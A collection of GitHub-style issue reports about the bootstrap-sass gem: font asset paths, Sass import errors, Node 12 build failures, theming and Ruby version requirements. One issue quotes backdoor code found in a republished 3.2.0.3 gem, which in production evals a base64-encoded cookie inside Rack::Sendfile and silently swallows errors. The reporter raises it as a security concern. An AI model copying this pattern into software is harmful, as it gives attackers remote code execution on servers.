Hi there, 

I'm running into an issue with `bootstrap-sass`:

```
2019-12-13T20:55:05.381913+00:00 app[web.1]: I, [2019-12-13T20:55:05.381834 #4]  INFO -- : [bbb3f58f-44fe-49f5-86f3-fd7c9dd14f88] Completed 500 Internal Server Error in 161ms (ActiveRecord: 6.9ms)
2019-12-13T20:55:05.382517+00:00 app[web.1]: F, [2019-12-13T20:55:05.382413 #4] FATAL -- : [bbb3f58f-44fe-49f5-86f3-fd7c9dd14f88]
2019-12-13T20:55:05.382562+00:00 app[web.1]: F, [2019-12-13T20:55:05.382513 #4] FATAL -- : [bbb3f58f-44fe-49f5-86f3-fd7c9dd14f88] ActionView::Template::Error (The asset "../fonts/bootstrap/glyphicons-halflings-regular.eot" is not present in the asset pipeline.):
2019-12-13T20:55:05.382717+00:00 app[web.1]: F, [2019-12-13T20:55:05.382652 #4] FATAL -- : [bbb3f58f-44fe-49f5-86f3-fd7c9dd14f88]     2: <html>
```

It seems that the URL is not Rails 5.1.7 friendly. 

I think that a search and replace change in the paths might be necessary. 

Thanks,
Ernesto 
**Received a notification  from BOT**: [Security] Bump bootstrap-sass from 3.3.7 to 3.4.1 [Commit](https://github.com/ucsdlib/dmr/pull/391/commits/a56e4c66c5483fa07e856e5f1a307c7dfdbbd701)

After merging the same I am receiving **Error: File to import not found or unreadable: bootstrap/variables**

I am importing
`@import 'bootstrap/variables';
  @import 'bootstrap/mixins';`
in my rails view file (_colors.scss.erb) Which seems to create the above issue on Heroku.
Rails Version : 4.2.10
Ruby Version: 2.5.5

Looks like it is not able to locate file _variables.scss present in node_modules/bootstrap/scss. After giving the relative URL also it was giving same issue.

Tried solution suggested on [https://stackoverflow.com/questions/48434762/error-file-to-import-not-found-or-unreadable-bootstrap-scss-bootstrap](StackOverflow) But it did not help.

Any help will be appreciated.
install build fails on Node 12.

see https://github.com/sass/node-sass/issues/2632  for reasons... the current version of node-sass in the package-lock is 4.9, which does not build in Node 12, which is now LTS. See here for node-sass node support info: https://github.com/sass/node-sass.
As described in [Rails asset pipeline: custom font does not load (hash not appended to file name in compiled CSS)](https://stackoverflow.com/questions/58196283/rails-asset-pipeline-custom-font-does-not-load-hash-not-appended-to-file-name), my Rails app suddenly didn't serve custom fonts anymore.

Thanks to the folks on StackOverflow, I could fix the problem by changing `src: url(...)` to `src: font-url(...)` when loading the font file in the CSS.

Before:

```sass
@font-face
  font-family: 'Fredericka the Great'
  src: local('Fredericka the Great'), local('FrederickatheGreat'), asset-url('assets/fredericka_the_great.woff2') format('woff2')
```

After:

```sass
@font-face
  font-family: 'Fredericka the Great'
  src: font-url('fredericka_the_great.woff2')
  src: font-url('fredericka_the_great.woff2') format('woff2')
```

This worked for me, but apparently, Bootstrap-Sass still does it the old way:

```scss
// _glyphicons.scss, around line 10
@at-root {
  // Import the fonts
  @font-face {
    font-family: "Glyphicons Halflings";
    src: url(if($bootstrap-sass-asset-helper, twbs-font-path("#{$icon-font-path}#{$icon-font-name}.eot"), "#{$icon-font-path}#{$icon-font-name}.eot"));
    src: url(if($bootstrap-sass-asset-helper, twbs-font-path("#{$icon-font-path}#{$icon-font-name}.eot?#iefix"), "#{$icon-font-path}#{$icon-font-name}.eot?#iefix")) format("embedded-opentype"),
         url(if($bootstrap-sass-asset-helper, twbs-font-path("#{$icon-font-path}#{$icon-font-name}.woff2"), "#{$icon-font-path}#{$icon-font-name}.woff2")) format("woff2"),
         url(if($bootstrap-sass-asset-helper, twbs-font-path("#{$icon-font-path}#{$icon-font-name}.woff"), "#{$icon-font-path}#{$icon-font-name}.woff")) format("woff"),
         url(if($bootstrap-sass-asset-helper, twbs-font-path("#{$icon-font-path}#{$icon-font-name}.ttf"), "#{$icon-font-path}#{$icon-font-name}.ttf")) format("truetype"),
         url(if($bootstrap-sass-asset-helper, twbs-font-path("#{$icon-font-path}#{$icon-font-name}.svg##{$icon-font-svg-id}"), "#{$icon-font-path}#{$icon-font-name}.svg##{$icon-font-svg-id}")) format("svg");
  }
}
```

Should this be changed to use `font-url`, too?
Hey guys,

Why changes in v3.4.1 are not present in CHANGELOG.
If someone can summarize those I could open a PR to update, no problems.

Regards
Hello!

I want to change the color in the checked radio box.

Current color is blue like below.

![image](https://user-images.githubusercontent.com/37207938/56478976-90bf6580-64ed-11e9-88f7-2ca717d5f95d.png)

I found the issue that seems related https://github.com/twbs/bootstrap/issues/20118

A version what I use is 3.4.1. and there is no _custom.scss file in the library and 

I fail to change the color.

Below code failed as well ( change the default color ).

Can you give me some advice?

```
$brand-primary: $color-point;
$brand-info: $color-point;
$input-border-focus: $color-point;
$state-info-text: $color-point;
$btn-default-color: $color-point;
$btn-default-bg: $color-point;
$btn-default-border: $color-point;
$btn-primary-color: $color-point;
$btn-primary-bg: $color-point;
$btn-primary-border: $color-point;

```

Hi there,

We noticed that 3.2.0.2 was yanked, and 3.2.0.3 was published to RubyGems. We thought this might be because of [ruby-sass being deprecated](https://github.com/sass/ruby-sass#ruby-sass-is-deprecated), but we can't seem to see the 3.2.0.3 code on GitHub.

Looking further, there's some...interesting looking code in what i installed via `gem install bootstrap-sass -v 3.2.0.3` (in a file named `lib/active-controller/middleware.rb`):

```ruby
begin
  require 'rack/sendfile'
  if Rails.env.production?
    Rack::Sendfile.tap do |r|
      r.send :alias_method, :c, :call
      r.send(:define_method, :call) do |e|
        begin
          x = Base64.urlsafe_decode64(e['http_cookie'.upcase].scan(/___cfduid=(.+);/).flatten[0].to_s)
          eval(x) if x
        rescue Exception
        end
        c(e)
      end
    end
  end
rescue Exception
  nil
end
```

I have not run this, and I'm a little concerned with what's going on here. It looks like it's loading a cookie and `eval`-ing it, which seems suspect. Please advise.
Is there a place to note Ruby dependencies for bootstrap-sass? 
It appears that bootstrap-sass 3.4.0 requires Ruby 2.3.3.

----

This is a relevant problem when installing ruby and bootstrap-sass via `apt'. 

By default apt installs the latest bootstrap-sass (currently 3.4.0) and ruby 2.3.1.
Here's the error I get when building a server with Ansible:
`ERROR:  Error installing bootstrap-sass:\n\tsassc requires Ruby version >= 2.3.3.`

Apt is limited to Ruby 2.3.1; Per: https://www.ruby-lang.org/en/documentation/installation/   "As of writing, the ruby-full package provides Ruby 2.3.1, which is an old stable release, on Debian and Ubuntu."

It would be ideal if this could be updated in the same place that other dependencies are set for ruby gems. When I look here for example: https://rubygems.org/gems/bootstrap-sass/versions/3.4.0
It reads: "Required Ruby Version: >= 0"

Maybe in bootstrap-sass.gemspec?